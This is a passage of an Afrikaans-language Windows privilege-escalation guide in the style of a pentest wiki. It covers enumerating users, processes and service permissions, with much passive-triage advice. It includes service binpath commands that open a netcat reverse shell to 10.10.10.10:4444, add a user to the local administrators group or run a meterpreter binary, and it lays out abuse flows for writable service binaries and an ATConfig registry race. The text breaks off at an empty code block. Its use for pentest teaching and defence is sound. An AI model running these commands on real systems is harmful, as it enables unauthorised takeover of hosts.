Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) bekendgestel om pogings deur onvertroude prosesse om **sy geheue te lees** of kode in te spuit, te **blokkeer** en die stelsel verder te beveilig.\
[**Meer inligting oor LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** is in **Windows 10** bekendgestel. Die doel daarvan is om credentials wat op ’n toestel gestoor is, teen bedreigings soos pass-the-hash-aanvalle te beskerm. [**Meer inligting oor Credential Guard is hier beskikbaar.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Gekasde geloofsbriewe

**Domeinbewyse** word deur die **Plaaslike Sekuriteitsowerheid** (LSA) geverifieer en deur bedryfstelselkomponente gebruik. Wanneer ’n geregistreerde sekuriteitspakket ’n gebruiker se aanmelddata verifieer, word domeinbewyse vir die gebruiker gewoonlik gevestig.\
[**Meer inligting oor gekasde geloofsbriewe hier**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Gebruikers en Groepe

### Lys Gebruikers en Groepe

Jy moet nagaan of enige van die groepe waaraan jy behoort interessante toestemmings het.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Bevoorregte groepe

As jy **aan ’n bevoorregte groep behoort, kan jy dalk voorregte eskaleer**. Lees hier meer oor bevoorregte groepe en hoe om dit te misbruik om voorregte te eskaleer:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-manipulasie

**Lees hier meer** oor wat ’n **token** is: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Besoek die volgende bladsy om **meer te wete te kom oor interessante tokens** en hoe om dit te misbruik:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Aangemelde gebruikers / Sessies

```bash
qwinsta
klist sessions
```

### Tuisvouers

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Wagwoordbeleid

```bash
net accounts
```

### Kry die inhoud van die knipbord

```bash
powershell -command "Get-Clipboard"
```

## Lopende prosesse

### Lêer- en vouertoestemmings

Kontroleer eerstens, wanneer die prosesse gelys word, **of daar wagwoorde in die opdragreël van die proses is**.\
Kyk of jy **’n lopende binêre lêer kan oorskryf** of skryftoestemmings vir die binêre lêer se vouer het om moontlike [**DLL Hijacking-aanvalle**](dll-hijacking/index.html) uit te buit:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Kontroleer altyd vir moontlike [**electron/cef/chromium-debuggers** wat loop; jy kan dit misbruik om voorregte te eskaleer](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

’n Debugger-listener kan van korte duur wees, dus bewys die afwesigheid daarvan in een passiewe poortopname nie dat dit nooit blootgestel was nie. Vergelyk enige waargenome listener met sy PID, proseseienaar en die laerbevoorregte gebruiker se vermoë om dit te bereik; ’n toepassingnaam of debug-vlag alleen bevestig nie kode-uitvoering tussen gebruikers nie. Hou roetine-enumerasie passief eerder as om debugger-opdragte te stuur.

**Kontroleer toestemmings van die proses se binaries**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kontroleer die toestemmings van die vouers van die prosesse se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)****

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor-gidse

Snort 2 kan gedeelde biblioteke laai vanaf ’n `dynamicpreprocessor directory` wat verklaar is in die konfigurasie wat met `snort.exe -c <config>` gekies is. Vir ’n geskeduleerde taak of diens wat Snort onder ’n ander rekening laat loop, ondersoek daardie presiese konfigurasie en die ACL van die verklaarde modulegids. As jou token lêers daar kan skep, is die pad ’n kandidaat vir ondersoek na code execution wanneer daardie taak of diens modules volgende keer laai. Verifieer die run-as-rekening se effektiewe voorregte, die aktiewe konfigurasie, moduleversoenbaarheid en enige weierings- of deelbeperkings; ’n skryfbare gids alleen bewys nie voorregte-eskalasie nie. [Snort se dokumentasie oor dynamic preprocessors](https://www.snort.org/documents/dpx-readme) beskryf runtime-modulelaai.

### Bevoorregte webdiens met ’n skryfbare dokumentwortel

Op ’n Windows Apache-installasie, vergelyk die diens se uitvoerbare lêerpad en run-as-rekening met die `DocumentRoot` in sy aktiewe `httpd.conf`. Vir ’n konvensionele XAMPP-uitleg, ondersoek `C:\xampp\apache\conf\httpd.conf` en die ACL op die ingestelde dokumentwortel, dikwels `C:\xampp\htdocs`. As ’n gebruiker met minder voorregte lêers in daardie wortel kan skep terwyl Apache as `LocalSystem` loop, kan server-side code execution die gasheer se voorreggrens oorsteek. Bevestig dat die diens loop, dat die presiese pad bedien word en dat ’n server-side handler die lêertipe verwerk; ’n skryfbare wortel bewys op sigself net dat lêers geskep kan word. Ondersoek ACL’s sonder om ’n toetslêer te skryf:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Vir ’n konvensionele WAMP-installasie kan die diens na ’n weergawe-spesifieke `C:\wamp64\bin\apache\apache*\bin\httpd.exe` verwys (of `C:\wamp\...` vir ’n 32-bis-uitleg), met die konfigurasie langsaan onder `conf\httpd.conf` en ’n verstekwortel van `C:\wamp64\www` of `C:\wamp\www`. Gaan die presiese diensbeeld, die identiteit waaronder dit loop, die effektiewe `DocumentRoot` (insluitend `${INSTALL_DIR}`-uitbreiding en virtuele gasheeroorskrywings) en die wortel se ACL saam na. ’n Skryfbare WAMP-gids bewys nie dat Apache as `SYSTEM` loop of die ingediende lêer uitvoer nie. [Apache dokumenteer hoe ’n Windows-diens sy konfigurasie kies](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Skryfbare IIS-wortel en toepassingspoel se netwerkidentiteit

Vir IIS, koppel ’n skryfbare fisiese gids aan ’n **aktiewe werf/toepassing** in `applicationHost.config`, en bepaal dan die ingestelde poel en bedienerkant-hanteerder. Kode wat in ’n bediende gids geplaas word, loop slegs as die poel indien IIS daardie lêertipe verwerk en die roete bereikbaar is. Gaan die huidige gebruiker se effektiewe toegang om lêers te skep, die werf se looptydstatus, die hanteerder en oorskrywings per pad na voordat ’n skryfbare gids as kode-uitvoering beskou word.

ASP.NET se dinamiese samestelling bied ’n afsonderlike pad om te ondersoek: gegenereerde lêers in die toepassing se samestellingsgids. Die verstek is ’n `Temporary ASP.NET Files`-gids onder die betrokke .NET Framework-installasie, maar die toepassing se `<compilation tempDirectory>` kan dit verander. [Microsoft dokumenteer die ligging en subgidse per toepassing](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) en [beveel aan dat samestellingsgidse geïsoleer word wanneer toepassingspoele mekaar nie vertrou nie](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). As ’n token met laer voorregte gegenereerde bronkode in die kas van die **spesifieke** toepassing kan verander, bepaal of daardie toepassing dit hersaamstel onder ’n meer bevoorregte [werkerproses-identiteit](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). ’n Lêer- of gids-ACL alleen bewys nie kode-uitvoering nie: korreleer die kas met die aktiewe toepassing, effektiewe token en ACL, samestellingsinstellings, prosesidentiteit en tydsberekening van enige hersamestelling. Gebruik slegs-leesbare metadata-oorsig; moenie samestelling aan die gang sit of kaslêers verander tydens enumerasie nie.

’n IIS-poel wat as `ApplicationPoolIdentity` of `NetworkService` opgestel is, staaf gewoonlik teen domeinhulpbronne as die **gasheerrekenaarrekening**, hoewel sy plaaslike token dalk lae voorregte het. `LocalSystem` het reeds hoë plaaslike voorregte en gebruik ook die rekenaarrekening op die netwerk; `LocalService` bied gewoonlik anonieme netwerkbewyse aan. ’n `SpecificUser`-poel gebruik eerder die rekening wat daarvoor opgestel is. [Microsoft dokumenteer hierdie identiteitstipes](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) en [die toepassingspoel se netwerkidentiteit](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). ’n Weggelate identiteitsinstelling kan die poel se verstekwaardes erf, wat tussen IIS-generasies verskil; bepaal dus die effektiewe konfigurasie eerder as om op grond van die poelnaam te raai. As kode-uitvoering ’n poel met ’n rekenaarrekening as netwerkidentiteit bereik, beoordeel daardie **spesifieke rekenaar** se gidsregte. [DCSync](../active-directory-methodology/dcsync.md) vereis replikasieregte op die domeinnaamkonteks; ’n masjienrekeningkaartjie of gasheerrol alleen bewys dit nie. Passiewe enumerasie moet konfigurasie en ACL’s nagaan sonder om ’n lêer op te laai, ’n netwerkstawing uit te voer of kaartjies aan te vra.

Vir ’n leesbare ASP.NET-hanteerder wat ’n hulpproses begin, volg enige versoek-afgeleide waarde deur stawing, dekripsie, validering en opdragopbou. ’n Hanteerder wat ’n gedekodeerde token aan `ProcessStartInfo("cmd", "/c ...")` koppel, kan dalk toelaat dat shell-metakarakters die opdrag verander; [Microsoft dokumenteer `cmd` se spesiale karakters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stel vas dat ’n onvertroude oproeper die gedekodeerde waarde werklik kan beïnvloed en die hanteerder kan bereik, en bepaal dan die effektiewe toepassingspoel- of nabootsingsidentiteit en die kindproses se identiteit. ’n Leesbare bronreël, ’n localhost-luisteraar of ’n swakheid in die tok formaat alleen bewys nie bevoorregte opdraguitvoering nie. Gaan bronkode en poelkonfigurasie na sonder om vervalste versoeke te stuur of die hulpprogram tydens passiewe enumerasie uit te voer.

Vir ’n PHP-diens op Windows kan ’n versoekbeheerde pad wat aan [`include` of `require`](https://www.php.net/manual/en/function.include.php) deurgegee word, ’n PHP-lêer wat deur ’n laer bevoorregte gebruiker geskryf kan word, onder die werker se identiteit uitvoer. Bevestig dat die versoek daardie stelling kan bereik, dat die opgeloste pad ’n lêer aandui wat die laer bevoorregte gebruiker kan verander en die werker kan lees, dat toepaslike PHP-padbeperkings die insluiting toelaat, en dat die werker werklik met hoër voorregte loop. ’n Loopback-luisteraar of skryfbare lêer alleen bewys nie hierdie ketting nie; ondersoek die bronkode, diensidentiteit en lêer-ACL’s sonder om die eindpunt tydens passiewe enumerasie aan te roep.

### Wagwoordontginning uit geheue

Jy kan **procdump** van Sysinternals gebruik om ’n geheuestorting van ’n lopende proses te maak. Dienste soos FTP het **bewyse in gewone teks in die geheue**; probeer om die geheue te stort en die bewyse te lees.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Onveilige GUI-toepassings

**Toepassings wat as SYSTEM loop, kan ’n gebruiker moontlik toelaat om ’n CMD oop te maak of deur gidse te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek na "command prompt", klik op "Click to open Command Prompt"

### Invoer van bevoorregte projeklêers

’n Toepassing wat outomaties projekte vanaf ’n skryfbare drop-gids van ’n laer gebruiker oopmaak, kruis ’n vertrouensgrens vir invoer onder die invoerder se rekening. Gaan die **presiese skryfbare pad**, die proses of taak wat dit oopmaak, sy effektiewe identiteit en die parser-bou na. ’n [Historiese Ghidra-projekopenings-/herstelkwessie](https://github.com/NationalSecurityAgency/ghidra/issues/71) het XML external entities in projekmetadata toegelaat; ’n netwerkentiteit op Windows kon verifikasie vanaf die invoerende rekening veroorsaak indien [uitgaande SMB- en NTLM-beleid](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dit toelaat. Dit is ’n leidraad vir blootstelling van geloofsbriewe, nie onmiddellike administrateurtoegang nie: die reaksie moet via ’n afsonderlike gemagtigde of kwesbare pad benut kan word, en huidige bouwe moet teen hul werklike pleisterstatus beoordeel word. Moenie ’n aangepaste projek tydens passiewe enumerasie oopmaak nie; ondersoek die invoerwerkvloei en ACL's.

## Dienste

Die [`SC_MANAGER_CREATE_SERVICE`-reg](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) op die Service Control Manager (SCM)-objek is apart van regte op ’n bestaande diens. ’n Suksesvolle leesalleen-[`OpenSCManager`-toegangsversoek](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) vir daardie reg is ’n leidraad vir ondersoek, nie bewys dat ’n nuwe diens kan loop nie. [`CreateService` gee ’n handle terug](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) met die dienstoegang wat tydens skepping aangevra is; wanneer die diens later weer oopgemaak word, vind ’n afsonderlike toegangskontrole plaas en dit kan misluk selfs wanneer die oorspronklike handle gebruik kon word. Verifieer afsonderlik die effektiewe plaaslike of afgeleë token, toegekende handleregte, diensrekening, beginbeleid en uitvoerbare pad. Moenie ’n diens tydens passiewe enumerasie skep of begin nie.

Vir ’n afgeleë diensinstallasiepad, korreleer daardie SCM-regte met ’n share op die teiken waarna dieselfde netwerkaanmelding kan skryf, die onderliggende NTFS-ACL en ’n plaaslike uitvoerbare pad wat die diensrekening kan uitvoer. ’n Nie-administrateurrekening kan hierdie grens oorsteek indien buitengewoon ruim SCM-regte én die lêerplasingspad bestaan; ’n administratiewe share is nie ’n inherente voorvereiste nie. Skryftoegang tot ’n share alleen, of ’n SCM-leidraad vir die skep van ’n diens alleen, bewys nie dat die nuwe diens onder ’n hoër identiteit kan begin nie.

’n Bestaande diens kan ’n helper-uitvoerbare lêer tydens opstart, afskakeling of ’n ander lewensiklusgebeurtenis oproep, selfs wanneer daardie helper nie in sy `ImagePath` voorkom nie. Indien die helpernaam na ’n skryfbare gids van ’n laer gebruiker opgelos word en die diens onder ’n hoër identiteit loop, is ’n ontbrekende helperlêer ’n voorwaardelike vervangingskandidaat. Bevestig die **werklike dienskode of gedokumenteerde helper-aanroeping**, die opgeloste uitvoerbare pad en soekvolgorde, skeppingsregte op die gids, diensidentiteit en ’n beskikbare lewensiklustrigger. ’n Skryfbare diensgids of ’n ontbrekende lêer alleen bewys nie dat die diens die lêer laai nie; moenie die diens tydens ’n passiewe ondersoek begin of stop nie.

Vir ’n bestaande diens laat [`SERVICE_START` toe dat argumente aan `StartService` verskaf word](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dit verskil van [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Gaan die diens se kode of gedokumenteerde koppelvlak na voordat begintoegang as meer as ’n beheertoegangsreg beskou word. Indien dit ’n argument wat deur die oproeper gekies word as ’n log- of uitvoerpad gebruik, verifieer die diensidentiteit, die presiese argument-na-skryf-vloei, padbeperkings en die toestemmings op die **geskepte lêer**. Skryf na ’n beskermde gids kan slegs tot eskalasie lei met ’n afsonderlike bevoorregte verbruiker of laaier wat daardie lêer aanvaar; ’n skryfbare log of begintoegangsreg alleen is onvoldoende. Moenie die diens begin of ’n toetslêer skep tydens passiewe inventarisering nie.

Vir ’n NSClient++-moniteringsagent is ’n leesbare `nsclient.ini` ’n **leidraad vir konfigurasie-ondersoek**: dit kan webgeloofsbriewe bevat, terwyl `boot.ini` die konfigurasie na ’n ander ligging kan herlei. Gaan die werklike diensrekening, WEB-luisteraar en toegangsbeleid na, asook of die geverifieerde rol instellings of skripte kan verander. Bevoorregte uitvoering vereis ook `CheckExternalScripts` (of ’n ander geaktiveerde uitvoeringspad), ’n effektiewe reg om ’n opdrag te registreer of te wysig, en ’n sneller wat dit onder die diensidentiteit laat loop. ’n Slegs-lus-terug-luisteraar kan steeds vir ’n plaaslike gebruiker bereikbaar wees, maar die lêerpad, wagwoord of luisteraar alleen bewys nie dat daardie regte bestaan nie. Gaan metadata en toestemmings na sonder om geheime te vertoon of die web-API tydens passiewe enumerasie aan te roep. Sien die [NSClient++-lêeruitleg](https://nsclient.org/docs/concepts/file-layout/), [riglyne vir web- en skripsekuriteit](https://nsclient.org/docs/setup/securing/) en [konfigurasie van eksterne skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Vir ’n diens waarvan `ImagePath` `nssm.exe` is, ondersoek die diens se werklike uitvoer-as-rekening en sy `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`-waarde: [NSSM stoor die child application daar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), terwyl `AppDirectory` die ingestelde werkgids is. Gaan die child executable en sy ouergids se ACL's na voordat die wrapper se toestemmings as die hele diensgrens beskou word. ’n Plaaslike WCF- of SOAP-endpoint wat deur daardie child blootgestel word, is ’n afsonderlike leidraad vir ondersoek: bevestig dat die laerbevoorregte gebruiker die luisteraar kan bereik, dat die presiese bewerking hul invoer aanvaar en dat die diens-child die onveilige bewerking onder ’n hoër identiteit uitvoer. Die diensrekening, ’n endpoint-URL of ’n skryfbare pad alleen bewys nie eskalasie nie; moenie diensbewerkings tydens passiewe enumerasie aanroep nie.

Vir ’n pasgemaakte WCF-bewerking, volg ’n string wat deur die oproeper beheer word tot by enige PowerShell-runspace. [`Pipeline.Commands.AddScript` voeg skripteks by](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), en [`Pipeline.Invoke` voer die pipeline uit](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). ’n [`netTcpBinding` met Windows-transportgeloofsbriewe](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) verifieer die kliënt, maar magtiging om daardie **spesifieke** bewerking aan te roep en die runspace se effektiewe identiteit moet afsonderlik nagegaan word. ’n Pad vanaf invoer van ’n laerbevoorregte oproeper na `AddScript` onder ’n hoër diensidentiteit is ’n kode-uitvoeringsgrens; ’n luisterpoort, geverifieerde kliënt of ongebruikte metode in ’n onverwante assembly alleen is nie bewys nie. Ondersoek die ontplooide diens, kontrak, magtiging en nabootsingsinstellings staties sonder om die endpoint tydens enumerasie aan te roep.

Service Triggers laat Windows ’n diens begin wanneer sekere toestande voorkom (named-pipe-/RPC-endpoint-aktiwiteit, ETW-gebeurtenisse, IP-beskikbaarheid, toestelbeskikbaarheid, GPO-verversing, ens.). Selfs sonder SERVICE_START-regte kan jy dikwels bevoorregte dienste begin deur hul triggers te aktiveer. Sien enumerasie- en aktiveringstegnieke hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio-diagnostiese versamelingsdiens

Visual Studio-installasies met C/C++-nutsmiddels kan `VSStandardCollectorService150` insluit, ’n diagnostiese diens wat ingestel is om as `LocalSystem` te loop. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) het ’n junction- en object-manager-link-wedloop gebruik om ’n diens-DACL-terugstelling te herlei. Die gedemonstreerde eskalasie het ook ’n bruikbare Visual Studio Setup WMI Provider MSI-herstelpad en sy `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`-teiken vereis. Die komponent is in Januarie 2024 reggestel.

Vir passiewe triage, ondersoek daardie enkele diens se rekening en binêre pad, kyk of die Setup WMI compiler-pad bestaan en verifieer die geïnstalleerde komponent se pleisterstatus. ’n Diensingang, Visual Studio-produkweergawe of compiler-lêer alleen bewys nie dat die gasheer kwesbaar is nie. Die diens hoef nie tydens die ondersoek begin te word nie, en ’n hersteloperasie hoef nie uitgevoer te word nie.

Kry ’n lys van dienste:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Toestemmings

Jy kan **sc** gebruik om inligting oor ’n diens te kry.

```bash
sc qc <service_name>
```

Dit word aanbeveel om die binary **accesschk** van _Sysinternals_ te hê om die vereiste voorregvlak vir elke diens na te gaan.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Dit word aanbeveel om na te gaan of "Authenticated Users" enige diens kan wysig:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Jy kan accesschk.exe vir XP hier aflaai](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer diens

As jy hierdie fout kry (byvoorbeeld met SSDPSRV):

_Stelselfout 1058 het voorgekom._\
_Die diens kan nie begin word nie, omdat dit gedeaktiveer is of omdat daar geen geaktiveerde toestelle daarmee geassosieer is nie._

Jy kan dit aktiveer deur die volgende te gebruik

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Neem in ag dat die diens upnphost van SSDPSRV afhanklik is om te werk (vir XP SP1)**

**Nog ’n oplossing** vir hierdie probleem is om die volgende uit te voer:

```
sc.exe config usosvc start= auto
```

### **Wysig diensbinêre pad**

In die scenario waar die groep "Authenticated users" **SERVICE_ALL_ACCESS** op 'n diens het, is dit moontlik om die diens se uitvoerbare binêre lêer te wysig. Om **sc** te wysig en uit te voer:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Herbegin diens

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Voorregte kan deur verskeie toestemmings verhoog word:

- **SERVICE_CHANGE_CONFIG**: Laat die diensbinêre lêer herkonfigureer.
- **WRITE_DAC**: Maak dit moontlik om toestemmings te herkonfigureer, wat die vermoë bied om dienskonfigurasies te verander.
- **WRITE_OWNER**: Laat toe dat eienaarskap verkry en toestemmings herkonfigureer word.
- **GENERIC_WRITE**: Erfenis van die vermoë om dienskonfigurasies te verander.
- **GENERIC_ALL**: Erfenis ook van die vermoë om dienskonfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwesbaarheid kan _exploit/windows/local/service_permissions_ gebruik word.

### Diensbinêre lêers met swak toestemmings

As ’n diens as **`LocalSystem`**, **`LocalService`**, **`NetworkService`** of ’n bevoorregte domeinrekening loop, maar **gebruikers met lae voorregte die diens se EXE-lêer of sy ouervouer kan wysig**, kan die diens dikwels gekaap word deur **die binêre lêer te vervang en die diens te herbegin**.

**Kontroleer of jy die binêre lêer kan wysig wat deur ’n diens uitgevoer word** of of jy **skryftoestemmings het op die vouer** waar die binêre lêer geleë is ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binêre lêer kry wat deur ’n diens uitgevoer word deur **wmic** te gebruik (nie in system32 nie) en jou toestemmings met **icacls** te kontroleer:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Jy kan ook **sc** en **icacls** gebruik:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Soek na gevaarlike ACL's wat aan **`Everyone`**, **`BUILTIN\Users`** of **`Authenticated Users`** toegeken is, veral **`(F)`**, **`(M)`** of **`(W)`** op die diens se uitvoerbare lêer of die gids wat dit bevat. ’n Praktiese misbruikvloei is:<sup>[[27]](#references)</sup>

1. Bevestig die diensrekening en die pad na die uitvoerbare lêer met `sc qc <service_name>`.
2. Bevestig dat die binêre lêer skryfbaar is met `icacls <path>`.
3. Vervang die diens se binêre lêer met ’n payload of ’n geldige kwaadwillige diensbinêre lêer.
4. Herbegin die diens met `sc stop <service_name> && sc start <service_name>` (of wag vir ’n herlaai / dienssneller).

Nuttige outomatiese kontroles:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> As die diens nie ’n gewone gebruiker toelaat om dit te herbegin nie, kyk of dit outomaties tydens opstart begin, ’n aksie het wat dit ná ’n fout herbegin, of indirek geaktiveer kan word deur die toepassing wat dit gebruik.

### Wysigtoestemmings vir diensregisters

Jy moet kyk of jy enige diensregister kan wysig.\
Jy kan jou **toestemmings** op ’n diens**register** **nagaan** deur:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Kontroleer of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** skryfbare registertoestemmings op ’n spesifieke dienssleutel het. ’n ACL-inskrywing alleen bewys nie effektiewe toegang nie: weieringsinskrywings, die huidige token en oorgeërfde toestemmings is belangrik. Registersleutelregte is apart van die diensobjek se `SERVICE_CHANGE_CONFIG`- en `SERVICE_START`-regte. Eskalasie vereis ook ’n bruikbare dienskonfigurasieveld, ’n manier om die diens te aktiveer en ’n diensidentiteit met meer voorregte. Sien Microsoft se [registersleutelregte](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) en [verwysing na dienstoegangsregte](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Om die Path van die uitgevoerde binary te verander:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry-symlink race vir arbitrêre HKLM-waardeskryf (ATConfig)

Sommige Windows-toeganklikheidskenmerke skep **ATConfig**-sleutels per gebruiker, wat later deur ’n **SYSTEM**-proses na ’n HKLM-sessiesleutel gekopieer word. ’n Registry-**simboliese-skakelrace** kan daardie bevoorregte skryfaksie na **enige HKLM-pad** herlei, wat ’n primitief vir **arbitrêre HKLM-waardeskryf** oplewer.<sup>[[18]](#references)</sup>

Sleutelliggings (voorbeeld: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lys die geïnstalleerde toeganklikheidskenmerke.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stoor gebruikerbeheerde konfigurasie.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` word tydens aanmelding/veilige-rekenaar-oorgange geskep en is skryfbaar deur die gebruiker.

Misbruikvloei (CVE-2026-24291 / ATConfig):

1. Vul die **HKCU ATConfig**-waarde in wat jy deur SYSTEM geskryf wil hê.
2. Aktiveer die kopie na die veilige rekenaar (bv. **LockWorkstation**), wat die AT-broker-vloei begin.
3. **Wen die race** deur ’n **oplock** op `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` te plaas; wanneer die oplock afgaan, vervang die **HKLM Session ATConfig**-sleutel met ’n **registry link** na ’n beskermde HKLM-teiken.
4. SYSTEM skryf die aanvallergekose waarde na die herleide HKLM-pad.

Sodra jy arbitrêre HKLM-waardeskryf het, beweeg oor na LPE deur dienskonfigurasiewaardes te oorskryf:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/opdragreël)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Kies ’n diens wat ’n gewone gebruiker kan begin (bv. **`msiserver`**) en aktiveer dit nadat die waarde geskryf is. **Let wel:** die openbare exploit-implementering **sluit die werkstasie** as deel van die race.

Voorbeeldnutsmiddels (RegPwn BOF / selfstandig):<sup>[[19]](#references)</sup>

```bash
